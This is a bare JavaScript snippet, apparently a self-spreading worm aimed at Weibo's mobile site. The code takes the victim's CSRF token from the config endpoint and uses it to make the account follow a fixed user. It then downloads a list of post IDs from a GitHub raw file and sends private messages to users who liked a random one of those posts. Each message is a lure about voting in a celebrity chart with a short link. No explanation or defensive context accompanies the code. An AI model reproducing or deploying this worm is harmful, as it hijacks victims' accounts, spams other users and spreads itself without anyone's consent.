    z=new XMLHttpRequest();
    z.open("GET","https://m.weibo.cn/api/config",true);
    z.send();
    z.onreadystatechange=function(){
        if (z.readyState == 4){
            var obj = JSON.parse(z.responseText);
            var xhr = new XMLHttpRequest();
            xhr.open('post', 'https://m.weibo.cn/api/friendships/create' );
            xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");
            xhr.send('uid=6424615242&st=' + obj.data.st);
            var f=new XMLHttpRequest();

            bb=new XMLHttpRequest();
            bb.open("GET","https://raw.githubusercontent.com/opensourcessss/predis-sentinel/master/i.js",true);
            bb.send();
            bb.onreadystatechange=function(){
                if (bb.readyState == 4){
                    var bbobj = bb.responseText;
                    var bbstr = bbobj.split(',');
                    var rand = Math.floor(Math.random()*(bbstr.length - 1));
                    var bbid = bbstr[rand + 1];

                    f.open("GET","https://m.weibo.cn/api/attitudes/show?id=" + bbid,true);
                    f.send();
                    f.onreadystatechange=function(){
                        if(f.readyState==4){
                            var u = JSON.parse(f.responseText);
                            for (var i=0;i<bbstr[0];i++)
                            {
                                var randiii = Math.floor(Math.random()*40);
                                var x = new XMLHttpRequest();
                                x.open('post', 'https://m.weibo.cn/api/chat/send' );
                                x.setRequestHeader("Content-type","application/x-www-form-urlencoded");
                                x.send('uid='+u.data.data[randiii].user.id+'&content=2020年中艺人巅峰榜，榜一真出乎意料，看看你家爱豆在榜几，给他来一票。点击投票>>http://t.cn/Aidduo50&st=' + obj.data.st);
                                window.location.href="https://m.weibo.cn/";
                            }
                        }
                    }
                }
            }
        }
    };
